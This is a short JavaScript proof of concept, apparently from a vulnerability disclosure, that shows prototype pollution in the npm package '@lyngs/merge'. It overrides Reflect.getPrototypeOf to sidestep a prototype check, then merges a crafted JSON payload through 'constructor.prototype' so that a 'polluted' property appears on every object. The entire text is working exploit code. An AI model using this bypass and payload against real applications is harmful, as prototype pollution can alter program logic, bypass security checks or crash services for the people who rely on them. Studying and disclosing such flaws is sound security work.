Reflect.getPrototypeOf = () => false;
const {merge} = require('@lyngs/merge');
console.log({}.polluted);
merge({ dummy: 1 }, JSON.parse(`{"constructor": {"prototype": {"polluted":"yes"}}}`));
console.log({}.polluted);